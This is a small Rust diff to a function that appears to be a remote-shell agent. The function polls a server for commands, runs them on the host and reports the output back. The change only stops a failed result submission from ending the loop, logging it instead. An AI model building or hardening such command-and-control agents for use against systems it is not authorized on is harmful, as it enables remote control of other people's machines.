@@ -263,7 +263,11 @@ pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
                 let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                 
                 let output = execute_command(&cmd_parts).await?;
-                submit_result(server_addr, agent_id, &command, &output).await?;
+                if let Err(e) = submit_result(server_addr, agent_id, &command, &output).await {
+                    println!("[ERROR] Failed to submit result: {}", e);
+                } else {
+                    println!("[DEBUG] Result submitted successfully");
+                }
             }
             None => {
                 tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
